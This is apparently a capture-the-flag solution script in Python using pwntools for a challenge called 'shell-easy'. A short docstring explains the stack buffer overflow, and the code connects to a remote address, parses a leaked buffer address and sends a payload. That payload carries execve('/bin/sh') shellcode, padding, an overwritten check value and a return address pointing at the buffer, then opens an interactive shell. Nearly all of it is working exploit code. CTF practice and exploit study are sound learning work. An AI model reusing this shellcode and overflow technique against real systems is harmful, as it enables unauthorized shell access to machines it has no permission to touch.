"""
shell-easy is a small program which is easy to Bof

It check a value with is at the stack so we need to modify the value so that the program wont exit
they will give u the address of the buffer so first we will get that address then we will jump there

So Buffer will be modified to:

[SHELLCODE][JUNK][0xdeadbeef <- the variable which check his value][addr of our byffer]

"""

from pwn import *

r=remote('52.15.182.55',12345)

buff_addr = r.recv(200)
print buff_addr[19:27]

hexvalue1 = int(buff_addr[19:21], 16)
hexvalue2 = int(buff_addr[21:23], 16)
hexvalue3 = int(buff_addr[23:25], 16)
hexvalue4 = int(buff_addr[25:27], 16)

# http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# 64 bytes to reach the saved eip
pad = 64 - len(shellcode)
payload = shellcode + "0"*(pad) + p32(0xdeadbeef) + "A"*8 + chr(hexvalue4) + chr(hexvalue3) + chr(hexvalue2) + chr(hexvalue1)

print(hexdump(payload))
r.sendline(payload)
r.interactive()
